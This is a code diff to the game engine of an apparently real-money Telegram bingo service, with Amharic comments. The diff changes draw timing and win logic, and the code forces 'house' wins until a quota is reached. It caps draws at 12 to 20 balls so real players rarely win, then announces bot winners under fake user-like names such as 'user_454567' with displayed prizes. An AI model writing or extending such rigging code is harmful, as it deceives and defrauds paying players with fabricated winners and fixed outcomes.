@@ -11,7 +11,7 @@ from app.models import Game, Setting, User, AdminStats, PlayerCard, Card
 
 BOT_NAMES = [
    "user_454567", "user_3561655", "user_998767", "user_6578866", "user_765465", "user_436688",  
-    "user_3456856", "user_564888", "user_8654519", "user_988786", "user_213456" "user_654321",
+    "user_3456856", "user_564888", "user_8654519", "user_988786", "user_213456", "user_654321",
     "user_4325677", "user_789646", "user_35567655", "user_456787", "user_344565", "user_3243567",
 ]
 
@@ -82,7 +82,9 @@ class GameEngine:
                 settings = db.query(Setting).first()
 
                 countdown_seconds = settings.countdown_seconds if (settings and hasattr(settings, 'countdown_seconds')) else 30
-                draw_interval = settings.draw_interval if (settings and hasattr(settings, 'draw_interval')) else 2.0
+                
+                # ⏱️ 🔴 የጥሪው ፍጥነት በየ 3 ሰከንድ እንዲሆን ነባሪው እሴት 3.0 ተደርጓል
+                draw_interval = settings.draw_interval if (settings and hasattr(settings, 'draw_interval')) else 3.0
 
                 game = Game(
                     status="running",
@@ -261,14 +263,23 @@ class GameEngine:
             room_status = {}
             force_all = True
             
-            for fee in SUPPORTED_FEES:
-                if self.house_counters.get(fee, 0) >= target_house_wins:
+            # 🎯 🔴 የጥንቁቅ ማሸነፊያ ሎጂክ እና የኳስ መገደቢያ
+            if target_house_wins == 0:
+                # Setting ላይ 0 ከተደረገ ሁልጊዜ ተጫዋች (USER) ብቻ እንዲያሸንፍ ይፈቀዳል (ተጫዋች ቢንጎ እስኪል ጥሪው ይ ቀጥላል)
+                for fee in SUPPORTED_FEES:
                     room_status[fee] = "ALLOW_PLAYER"
-                    force_all = False
-                else:
-                    room_status[fee] = "FORCE_HOUSE"
+                max_draw_balls = 75 
+            else:
+                # Setting ላይ 1, 2, 3... ከተደረገ ኳሱ በምንም ተአምር ከ 20 አይበልጥም!
+                for fee in SUPPORTED_FEES:
+                    if self.house_counters.get(fee, 0) >= target_house_wins:
+                        room_status[fee] = "ALLOW_PLAYER"
+                        force_all = False
+                    else:
+                        room_status[fee] = "FORCE_HOUSE"
 
-            max_draw_balls = random.randint(10, 15) if force_all else 20
+                # 📌 በከፍተኛው 20 ኳስ ብቻ ይገደባል (ከ 12 እስከ 20)
+                max_draw_balls = random.randint(12, 20)
 
             winner_detected = False
 
@@ -326,7 +337,7 @@ class GameEngine:
                             "telegram_name": telegram_name,
                             "card_number": w["card_number"],
                             "room_fee": w["bet_amount"],
-                            "prize": round(w["prize_share"], 2), # ✅ የተካፈለው የራሱን ክፍል ደራሽ ብቻ ነው!
+                            "prize": round(w["prize_share"], 2),
                             "winning_numbers": w["winning_numbers"],
                             "card_numbers": w["card_numbers"],
                             "winning_reason": w["winning_pattern"]
@@ -334,14 +345,13 @@ class GameEngine:
 
                     primary_winner = winners_data[0]
 
-                    # 📌 ፊክስ፦ 'prize' የሚለው ዋና ማሳያ የድምሩ ሳይሆን የአሸናፊው ክፍል ደራሽ ብቻ እንዲሆን ተደርጓል!
                     await self.safe_broadcast({
                         "type": "game_over",
                         "status": "WINNER_FOUND",
                         "result": "BINGO",
                         "winner_name": primary_winner["telegram_name"],
                         "winning_card": primary_winner["card_number"],
-                        "prize": primary_winner["prize"], # 👈 የአሸናፊው ክፍል ደራሽ ብቻ ይታያል
+                        "prize": primary_winner["prize"],
                         "room_fee": primary_winner["room_fee"],
                         "message": f"🎉 በዙሩ {len(winners_data)} አሸናፊዎች ተገኝተው የየክፍላቸውን ሽልማት ተካፍለዋል!",
                         "card_number": primary_winner["card_number"],
@@ -357,10 +367,11 @@ class GameEngine:
                 if call_count >= max_draw_balls:
                     break
 
+                # ⏱️ በየ 3 ሰከንዱ እንዲጠራ የተደረገበት ቦታ
                 await asyncio.sleep(interval)
 
-            # 🤖 3. የሀውስ/ቦት ማሸነፊያ ክፍል
-            if not winner_detected and self.running:
+            # 🤖 3. የሀውስ/ቦት ማሸነፊያ ክፍል (የሚሰራው target_house_wins > 0 ሆኖ እውነተኛ ተጫዋች ካላሸነፈ ብቻ ነው)
+            if not winner_detected and self.running and target_house_wins > 0:
                 result = self.force_house_win(db, saved_game_id, self.called_numbers, pools_by_fee, bought_cards, all_200_cards)
                 winner_name = random.choice(BOT_NAMES)
 
@@ -368,7 +379,6 @@ class GameEngine:
                     self.house_counters[fee] = self.house_counters.get(fee, 0) + 1
                     print(f"🤖 House Win በ {fee} ብር ክፍል! የአሁኑ ቆጣሪ፦ {self.house_counters[fee]}/{target_house_wins}")
 
-                # 📌 ፊክስ፦ ቦቱ ያሸነፈበትን የአንዱን ዋና ክፍል ደራሽ ብቻ መውሰድ
                 primary_bot_fee = active_rooms[0] if active_rooms else 10.0
                 bot_prize_display = derash_by_fee.get(str(int(primary_bot_fee)), 0)
 
@@ -378,7 +388,7 @@ class GameEngine:
                     "result": "BINGO",
                     "winner_name": winner_name,
                     "winning_card": result["card_number"],
-                    "prize": round(bot_prize_display, 2), # 👈 የአንዱ ክፍል ደራሽ ብቻ ይታያል
+                    "prize": round(bot_prize_display, 2),
                     "message": f"🎉 ካርድ #{result['card_number']} ({winner_name}) በ {int(primary_bot_fee)} ብር ክፍል አሸንፏል!",
                     "card_number": result["card_number"],
                     "winner_id": result["winner_id"],
